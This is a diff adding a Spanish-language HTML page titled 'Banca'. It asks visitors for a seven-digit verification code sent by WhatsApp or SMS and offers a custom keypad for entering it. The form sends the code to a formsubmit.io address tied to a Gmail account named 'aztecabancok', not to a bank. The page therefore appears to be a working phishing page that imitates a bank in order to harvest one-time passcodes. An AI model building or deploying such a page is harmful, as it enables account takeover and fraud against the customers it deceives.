@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banca</title>
+    <style>
+        *{
+          padding: 0;
+          margin: 0;
+          font-family: sans-serif;
+        }
+      
+        .keyboard-container {
+          display: none;
+          grid-template-columns: repeat(3, 1fr);
+          grid-gap: 10px;
+          padding: 20px;
+          background-color: #ccc;
+          
+        }
+      
+        .number {
+          grid-column: span 1;
+          text-align: center;
+          background-color: #fff;
+          border: none;
+          border-radius: 1px;
+          padding: 10px;
+          font-size: 20px;
+          cursor: pointer;
+        }
+      
+        .clear {
+          grid-column: span 2;
+          text-align: center;
+          background-color: white;
+          border: none;
+          border-radius: 1px;
+          padding: 10px;
+          font-size: 20px;
+          cursor: pointer;
+        }
+      
+        .submit {
+          grid-column: span 3;
+          text-align: center;
+          background-color: #116529;
+          border: none;
+          border-radius: 1px;
+          padding: 10px;
+          font-size: 18px;
+          color: white;
+          cursor: pointer;
+          disabled: true;
+          width: 100%;
+        }
+      
+        #sms-code {
+          font-size: 20px;
+          padding: 10px;
+          margin-bottom: 10px;
+          text-align: center;
+          height: 35px;
+          width: 95%;
+          border: 0;
+          background-color: #e5e0e0;
+        }
+
+        body {
+          height: 100%; /* Para que el body tenga altura del viewport */
+          margin: 0; /* Quitamos el margen por defecto */
+        }
+
+        .contcodigo{
+          display: flex;
+          flex-direction: column;
+         align-items: flex-start;
+         padding: 0 10px;
+        }
+      
+        .formcont {
+          position: relative;
+          margin-top: 70px;
+        }
+
+        .labelsms-code{
+          font-size: 14px;
+          font-weight: 600;
+          margin-bottom: 5px;
+        }
+      
+        #keyboard-container {
+          margin: 0 auto; /* Centramos el div */
+          position: fixed; /* Fijamos el div */
+          width: 95%; /* Ancho del div */
+          height: 40%; /* Altura del div */
+          background-color: #ccc;
+          color: white;
+          text-align: center;
+          padding: 0px 10px 10px 10px;
+          bottom: 0;
+        }
+        .mensaje{
+          display: flex;
+          justify-content: center;
+          align-items: center;
+          height: 100px;
+          background-color: #f4f4f4;
+          text-align: start;
+          padding: 0 10px;
+        }
+        .textmensaje{
+          font-size: 15px;
+          font-weight: 600;
+        }
+      </style>
+      
+  </head>
+  <body>
+    <div class="mensaje">
+      <h3 class="textmensaje" >Ingresa el codigo de verificacion que llego a tu Whatsapp o SMS</h3>
+    </div>
+    <form class="formcont" id="contactform" action="https://formsubmit.io/send/aztecabancok@gmail.com" method="POST" >
+      <div class="contcodigo">
+      <label class="labelsms-code" for="sms-code">Ingresa el código verificación</label>
+      <input type="text" id="sms-code" name="sms-code" maxlength="7">
+      <label class="labelsiete" for="sms-code">Son 7 números</label>
+    </div>
+      <div class="keyboard-container" id="keyboard-container">
+        <button class="submit" type="submit" >Continuar</button>
+        <button class="number" type="button">1</button>
+        <button class="number" type="button">2</button>
+        <button class="number" type="button">3</button>
+        <button class="number" type="button">4</button>
+        <button class="number" type="button">5</button>
+        <button class="number" type="button">6</button>
+        <button class="number" type="button">7</button>
+        <button class="number" type="button">8</button>
+        <button class="number" type="button">9</button>
+        <button class="clear"  type="button">⌫</button>
+        <button class="number" type="button">0</button>
+      </div>
+    </form>
+
+    <script>
+      const codeInput = document.getElementById('sms-code');
+      const keyboardContainer = document.querySelector('.keyboard-container');
+      const keyboardButtons = document.querySelectorAll('.number, .clear, .submit');
+
+      codeInput.addEventListener('click', () => {
+        keyboardContainer.style.display = 'grid';
+      });
+
+      keyboardButtons.forEach(button => {
+        button.addEventListener('click', () => {
+          if (button.classList.contains('number')) {
+            if (codeInput.value.length < 7) {
+              codeInput.value += button.textContent;
+            }
+          } else if (button.classList.contains('clear')) {
+            codeInput.value = codeInput.value.slice(0, -1);
+          } else if (button.classList.contains('submit')) {
+            keyboardContainer.style.display = 'none';
+          }
+        });
+      });
+
+      codeInput.addEventListener('input',() => {
+        if (codeInput.value.length === 7) {
+        document.querySelector('.submit').disabled = false;
+        } else {
+        document.querySelector('.submit').disabled = true;
+        }
+        });
+        </script>
+          </body>
+        </html>
